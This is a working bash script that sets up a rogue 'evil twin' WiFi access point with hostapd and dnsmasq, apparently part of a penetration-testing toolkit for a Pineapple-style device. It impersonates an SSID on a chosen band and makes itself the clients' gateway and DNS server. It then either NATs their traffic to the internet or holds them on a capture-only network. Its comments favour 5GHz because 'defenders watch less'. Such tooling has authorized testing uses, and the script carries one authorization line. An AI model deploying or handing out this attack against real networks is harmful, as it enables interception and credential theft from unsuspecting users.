#!/bin/bash
# rogueap.sh - stand up a rogue access point on an arbitrary radio with
# hostapd + dnsmasq, optionally NAT'd out an uplink. Its reason to exist
# alongside EvilTwin.sh: EvilTwin uses the Pager's official PineAP path, which
# is locked to radio0 (2.4GHz). rogueap.sh drives hostapd directly on ANY
# interface - so it can put a twin on 5GHz (approved idea W12), which many
# clients prefer and defenders watch less, using the dual-band external A8000.
#
# Needs a hostapd-capable interface in AP mode. The internal radios are busy
# with PineAP; the intended interface is the external A8000 (wlan2). Marked as
# needing on-device validation with that adapter attached.
#
# Usage:
#   rogueap.sh --up --ssid NAME [--iface wlan2] [--channel 36] [--band a|g]
#              [--pass WPA2PASS] [--uplink eth1]
#   rogueap.sh --down
#   rogueap.sh --status
#
# --band a = 5GHz (default when channel>=36), g = 2.4GHz. --uplink NATs client
# traffic out that interface (omit for a no-internet capture-only AP).
#
# IMPORTANT: only in environments you own or are explicitly authorized to test.

set -u
TOOL_NAME="rogueap.sh"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
. "$SCRIPT_DIR/lib/common.sh"
export PATH="$PATH:/mmc/usr/bin:/mmc/usr/sbin"

RUN=/tmp/pager-rogueap
HCONF="$RUN/hostapd.conf"; DCONF="$RUN/dnsmasq.conf"
HPID="$RUN/hostapd.pid"; DPID="$RUN/dnsmasq.pid"
AP_IP="10.66.66.1"; AP_NET="10.66.66.0/24"; AP_RANGE="10.66.66.50,10.66.66.150"

MODE=""; SSID=""; IFACE="wlan2"; CHANNEL="36"; BAND=""; PASS=""; UPLINK=""
filter_yes_args "$@"; set -- "${FILTERED_ARGS[@]}"
while [ $# -gt 0 ]; do
    case "$1" in
        --up) MODE="up"; shift ;;
        --down) MODE="down"; shift ;;
        --status) MODE="status"; shift ;;
        --ssid) SSID="${2:-}"; shift 2 ;;
        --iface) IFACE="${2:-}"; shift 2 ;;
        --channel) CHANNEL="${2:-}"; shift 2 ;;
        --band) BAND="${2:-}"; shift 2 ;;
        --pass) PASS="${2:-}"; shift 2 ;;
        --uplink) UPLINK="${2:-}"; shift 2 ;;
        -h|--help) sed -n '2,24p' "$0" | sed 's/^# \{0,1\}//'; exit 0 ;;
        --) shift ;;
        *) die "Unknown option: $1" ;;
    esac
done
[ -n "$MODE" ] || { sed -n '2,24p' "$0" | sed 's/^# \{0,1\}//'; exit 1; }

nft_or_ipt_nat() {  # $1 = add|del
    # OpenWRT fw4 uses nftables; fall back to iptables if present.
    if command -v nft >/dev/null 2>&1; then
        if [ "$1" = "add" ]; then
            nft add table ip rogueap 2>/dev/null
            nft add chain ip rogueap post '{ type nat hook postrouting priority 100 ; }' 2>/dev/null
            nft add rule ip rogueap post ip saddr "$AP_NET" oifname "$UPLINK" masquerade 2>/dev/null
        else
            nft delete table ip rogueap 2>/dev/null
        fi
    elif command -v iptables >/dev/null 2>&1; then
        iptables -t nat -"$([ "$1" = add ] && echo A || echo D)" POSTROUTING -s "$AP_NET" -o "$UPLINK" -j MASQUERADE 2>/dev/null
    fi
}

case "$MODE" in
up)
    command -v hostapd >/dev/null 2>&1 || die "hostapd not found."
    command -v dnsmasq >/dev/null 2>&1 || die "dnsmasq not found."
    [ -n "$SSID" ] || die "--ssid required."
    [ -e "/sys/class/net/$IFACE" ] || die "Interface $IFACE not present (plug in the external A8000, or pass --iface)."
    case "$CHANNEL" in *[!0-9]*) die "--channel must be numeric." ;; esac
    [ -z "$BAND" ] && { [ "$CHANNEL" -ge 36 ] && BAND="a" || BAND="g"; }
    mkdir -p "$RUN"
    # hostapd config
    {
        echo "interface=$IFACE"
        echo "ssid=$SSID"
        echo "hw_mode=$BAND"
        echo "channel=$CHANNEL"
        echo "auth_algs=1"
        echo "ignore_broadcast_ssid=0"
        if [ -n "$PASS" ]; then
            [ "${#PASS}" -ge 8 ] || die "WPA2 password must be >= 8 chars."
            echo "wpa=2"; echo "wpa_key_mgmt=WPA-PSK"; echo "rsn_pairwise=CCMP"
            echo "wpa_passphrase=$PASS"
        fi
    } > "$HCONF"
    # bring up the AP interface with our gateway IP
    ip link set "$IFACE" down 2>/dev/null
    ip addr flush dev "$IFACE" 2>/dev/null
    ip addr add "$AP_IP/24" dev "$IFACE" 2>/dev/null
    ip link set "$IFACE" up 2>/dev/null
    # dnsmasq for DHCP+DNS on the AP net
    {
        echo "interface=$IFACE"
        echo "bind-interfaces"
        echo "dhcp-range=$AP_RANGE,12h"
        echo "dhcp-option=3,$AP_IP"
        echo "dhcp-option=6,$AP_IP"
    } > "$DCONF"
    say "Starting hostapd on $IFACE (SSID '$SSID', ${BAND}/ch$CHANNEL)..."
    hostapd -B -P "$HPID" "$HCONF" >/tmp/pager-rogueap.log 2>&1 || die "hostapd failed - see /tmp/pager-rogueap.log (interface may not support AP mode on this band/channel)."
    dnsmasq -x "$DPID" -C "$DCONF" >>/tmp/pager-rogueap.log 2>&1 || { say "dnsmasq failed - clients won't get an IP (see log)."; }
    if [ -n "$UPLINK" ]; then
        echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null
        nft_or_ipt_nat add
        say "Uplink NAT via $UPLINK enabled - clients get real internet."
    else
        say "No --uplink: capture-only AP (clients associate but have no internet)."
    fi
    say "Rogue AP up. Stop with --down."
    ;;
down)
    [ -f "$HPID" ] && kill "$(cat "$HPID")" 2>/dev/null; rm -f "$HPID"
    [ -f "$DPID" ] && kill "$(cat "$DPID")" 2>/dev/null; rm -f "$DPID"
    pkill -f "hostapd -B -P $HPID" 2>/dev/null
    [ -n "$UPLINK" ] && nft_or_ipt_nat del
    nft delete table ip rogueap 2>/dev/null
    ip addr flush dev "$IFACE" 2>/dev/null
    say "Rogue AP torn down."
    ;;
status)
    if [ -f "$HPID" ] && kill -0 "$(cat "$HPID" 2>/dev/null)" 2>/dev/null; then
        say "Rogue AP running (hostapd PID $(cat "$HPID"))."
    else say "Not running."; fi
    ;;
esac
